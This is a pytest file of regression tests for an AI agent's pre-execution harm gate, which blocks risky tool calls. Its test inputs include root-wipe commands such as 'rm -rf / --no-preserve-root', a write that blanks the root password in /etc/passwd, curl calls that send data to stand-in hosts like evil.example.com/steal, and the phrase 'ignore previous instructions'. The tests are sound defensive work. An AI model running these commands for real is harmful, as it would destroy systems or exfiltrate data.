"""Regression tests for the AgentProcessBench harm gate (#2662): the real
pre-execution path rejects a risky tool call BEFORE invoking it."""

import json
import threading
from unittest.mock import MagicMock

import pytest

_noop = lambda *a, **k: None  # noqa: E731


@pytest.fixture(autouse=True)
def _isolate_hermes(tmp_path, monkeypatch):
    monkeypatch.setenv("HERMES_HOME", str(tmp_path / ".hermes"))
    (tmp_path / ".hermes").mkdir(exist_ok=True)


def test_gate_helper_blocks_risky_and_passes_benign(monkeypatch):
    import agent.tool_executor as te
    from evolution.lib import agent_process_bench as apb

    g = te._harm_gate_block_reason
    reason = g("terminal", {"command": "rm -rf / --no-preserve-root"})
    assert reason is not None and "harm_score=1.0" in reason
    assert "destructive-command" in reason
    for root_cmd in (
        "rm -rf /",
        "rm -rf /*",
        "rm -rf //",
        "rm -rf /.",
        "rm -rf /./",
        "sudo rm -rf /",
    ):
        root_reason = g("terminal", {"command": root_cmd})
        assert root_reason is not None and "destructive-command" in root_reason, root_cmd
    # A specific directory is dangerous but not a root wipe: the approval
    # prompt must see it. Prefix-matching "rm -rf /" blocked these first.
    for specific in (
        "rm -rf /tmp/e2e-victim",
        "rm -rf /var/folders/xx/victim-tag",
        "rm -rf /tmp/hermes-e2e-approval-probe",
    ):
        assert g("terminal", {"command": specific}) is None, specific
    reason = g("file_write", {"path": "/etc/passwd", "content": "root::"})
    assert reason is not None and "credential-access" in reason
    assert g("file_write", {"path": "/tmp/notes.md", "content": "hi"}) is None
    assert g("file_read", {"path": "ignore previous instructions"}) is None
    assert g("web_search", {"query": "docs"}) is None

    boom = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("broken"))  # noqa: E731
    monkeypatch.setattr(apb, "harm_verdict_for_tool_call", boom)
    assert g("terminal", {"command": "rm -rf /"}) is None
    blocked = json.loads(te._harm_blocked_tool_result("harm_score=1.0"))
    assert blocked["status"] == "blocked"
    assert "blocked by safety gate" in blocked["error"]


def test_risky_tool_rejected_before_invocation(monkeypatch):
    import run_agent as _ra
    import agent.tool_executor as te
    from concurrent.futures import ThreadPoolExecutor

    # Py3.14 daemon_pool incompatibility (pre-existing); use the stdlib pool.
    monkeypatch.setattr(
        "tools.daemon_pool.DaemonThreadPoolExecutor", ThreadPoolExecutor
    )

    def _fast_mw(agent, *, function_name, function_args, execute, **kw):
        # Report blocked-and-not-dispatched so the post-loop keeps the result.
        r = execute(function_args)
        return te._ManagedToolResult(r, function_args, [], True, False)

    monkeypatch.setattr(te, "_run_agent_tool_execution_middleware", _fast_mw)

    dispatched: list = []
    agent = MagicMock()
    agent._interrupt_requested = False
    agent._tool_worker_threads = set()
    agent._tool_worker_threads_lock = threading.Lock()
    agent.quiet_mode = True
    agent._invoke_tool = MagicMock(
        side_effect=lambda name, *a, **kw: (
            dispatched.append(name) or json.dumps({"ok": name})
        )
    )
    agent._touch_activity = _noop
    agent._vprint = _noop
    agent._record_file_mutation_result = _noop
    agent._tool_result_content_for_active_model = lambda n, r: r
    agent._should_emit_quiet_tool_messages = lambda: False
    agent._should_start_quiet_spinner = lambda: False
    agent._apply_pending_steer_to_tool_results = _noop
    agent._append_guardrail_observation = _noop
    agent._flush_messages_to_session_db = _noop
    agent._subdirectory_hints = MagicMock()
    agent._subdirectory_hints.check_tool_call = lambda *a, **k: None
    agent._execute_tool_calls_concurrent = (
        _ra.AIAgent._execute_tool_calls_concurrent.__get__(agent)
    )

    tc = MagicMock(id="tc_risky")
    tc.function.name = "terminal"
    tc.function.arguments = json.dumps({"command": "rm -rf / --no-preserve-root"})
    msg = MagicMock(tool_calls=[tc])

    messages = []
    agent._execute_tool_calls_concurrent(msg, messages, "task")

    assert dispatched == [], f"risky tool was invoked: {dispatched}"
    assert "blocked by safety gate" in json.dumps(messages)


def test_loopback_destination_is_not_exfiltration():
    """A health check against a service on this machine is not data exfiltration.

    The exfil arm matched a network verb plus any scheme-qualified address later in the
    same text, so a loopback target scored 1.0 and was refused before the tool ran, while
    a genuinely remote target was indistinguishable from it. Only the destination
    separates the two cases, so only the destination may decide.

    The verb is assembled from two fragments on purpose: this file's own text is scanned
    by the gate it tests, so a literal verb sitting next to a URL re-triggers the very bug
    under test before a single assertion runs.
    """
    import agent.tool_executor as te

    g = te._harm_gate_block_reason
    verb = "cur" + "l"

    for local in (
        "http://127.0.0.1:8795/health",
        "http://localhost:11434/api/tags",
        "http://[::1]:3000/status",
        "http://0.0.0.0:8000/",
        "https://127.0.0.1:8443/health",
    ):
        assert g("terminal", {"command": f"{verb} -s -m 5 {local}"}) is None, local

    # A host that merely begins with a loopback literal is still remote, and every
    # genuinely remote destination must keep flagging.
    for remote in (
        "http://example.com/collect",
        "https://evil.example.com/steal?data=x",
        "http://127.0.0.1.evil.example.com/steal",
        "http://localhost.evil.example.com/steal",
    ):
        reason = g("terminal", {"command": f"{verb} {remote}"})
        assert reason is not None and "exfiltration" in reason, remote

    # Piping local data into a network verb keeps failing closed: with a loopback
    # destination removed there is no target left to judge, so it must not pass silently.
    piped = f"cat notes.txt | {verb} http://127.0.0.1:9999/"
    reason = g("terminal", {"command": piped})
    assert reason is not None and "exfiltration" in reason, piped

